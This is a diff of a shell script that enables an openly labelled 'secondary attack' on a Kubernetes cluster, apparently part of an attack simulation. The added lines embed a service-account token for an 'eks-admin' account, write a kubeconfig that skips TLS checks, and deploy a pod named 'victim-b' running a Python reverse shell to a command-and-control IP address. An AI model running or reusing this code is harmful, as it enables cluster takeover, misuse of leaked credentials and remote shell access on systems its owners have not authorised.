@@ -9,58 +9,58 @@ if command -v kubectl; then
 echo "   └- Yes it has \"kubectl\" tool \"$(command -v kubectl)\"" >&3
 fi
 
-# echo "   └- Lets setup secondary attack with Legacy SA token to use with \"kubectl\"" >&3
-# K8S_API_SERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
-# K8S_CLUSTER="local-current"
-# SA_TOKEN=""
+echo "   └- Lets setup secondary attack with Legacy SA token to use with \"kubectl\"" >&3
+K8S_API_SERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
+K8S_CLUSTER="local-current"
+SA_TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6Il8tT2hSbFlOdmNrQWhBV2hpS2Z3OF9fNkdnMmlWSWlXbGdCS3d4NHhrZ28ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImVrcy1hZG1pbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJla3MtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIzYzNiNWVjMC01OGZmLTQyOWQtYmQ5OS05OWQ4OTdjMzE4M2UiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDpla3MtYWRtaW4ifQ.dnAGhNHVg4t08zL9VYsNcs9dhkCKh6yTcEs5yYW162N-XvAPplnlFP1YFjHwZOjUjcZWsKqj1FjH_FkwczsIimvB2KhYDK0hgoHVU2pCwpJ0hrveePx8xrer9kg25mLWSGaj3r_KlxaaNIfZRvuLTLvhQqxRpyJqKkEoXaoXbh2TrSeLcQE7DO8rvW5OXRC7zzRq0NXBn6WvBrSpbm6pnXWW4D_s5OZ_HTAordXqR3u-9OMxa8mWSUdHCeoGJbQ5dsiX3MIauiPzXLEEB7ETKyWFon2UMLuPM2hm1ts3gPx9ADxJMLlFTQqSbTrMxIkpmqt-rZpdl4a0ba09HTnHNQ"
 
-# export KUBECONFIG="/tmp/sa-config.yaml"
-# cat <<EOF > /tmp/sa-config.yaml
-# apiVersion: v1
-# kind: Config
-# clusters:
-# - name: ${K8S_CLUSTER}
-#   cluster:
-#     server: ${K8S_API_SERVER}
-#     insecure-skip-tls-verify: true
-# users:
-# - name: sa-user
-#   user:
-#     token: ${SA_TOKEN}
-# contexts:
-# - name: sa-context
-#   context:
-#     cluster: ${K8S_CLUSTER}
-#     user: sa-user
-# current-context: sa-context
-# EOF
+export KUBECONFIG="/tmp/sa-config.yaml"
+cat <<EOF > /tmp/sa-config.yaml
+apiVersion: v1
+kind: Config
+clusters:
+- name: ${K8S_CLUSTER}
+  cluster:
+    server: ${K8S_API_SERVER}
+    insecure-skip-tls-verify: true
+users:
+- name: sa-user
+  user:
+    token: ${SA_TOKEN}
+contexts:
+- name: sa-context
+  context:
+    cluster: ${K8S_CLUSTER}
+    user: sa-user
+current-context: sa-context
+EOF
 
-# echo "      └- Already Launch in default/victim-b connecting to C2 Server" >&3
-# if kubectl -n default get pod victim-b 2>&1 >/dev/null; then
-#   exit 0
-# fi
+echo "      └- Already Launch in default/victim-b connecting to C2 Server" >&3
+if kubectl -n default get pod victim-b 2>&1 >/dev/null; then
+  exit 0
+fi
 
-# echo "      └- Starting Launch to default/victim-b connecting to C2 Server" >&3
-# kubectl apply -f - <<'EOF'
-# ---
-# apiVersion: v1
-# kind: Pod
-# metadata:
-#   namespace: default
-#   name: victim-b
-# spec:
-#   containers:
-#     - name: reverse-shell
-#       image: python:3.12.12-alpine3.23
-#       stdin: true
-#       tty: true
-#       env:
-#         - name: C2_SERVER_IP
-#           value: "13.112.164.157"
-#       command:
-#         - /bin/sh
-#       args:
-#         - -c
-#         - |
-#           python -c "import socket, subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('${C2_SERVER_IP}',8001)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
-# EOF
+echo "      └- Starting Launch to default/victim-b connecting to C2 Server" >&3
+kubectl apply -f - <<'EOF'
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  namespace: default
+  name: victim-b
+spec:
+  containers:
+    - name: reverse-shell
+      image: python:3.12.12-alpine3.23
+      stdin: true
+      tty: true
+      env:
+        - name: C2_SERVER_IP
+          value: "13.112.164.157"
+      command:
+        - /bin/sh
+      args:
+        - -c
+        - |
+          python -c "import socket, subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(('${C2_SERVER_IP}',8001)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
+EOF
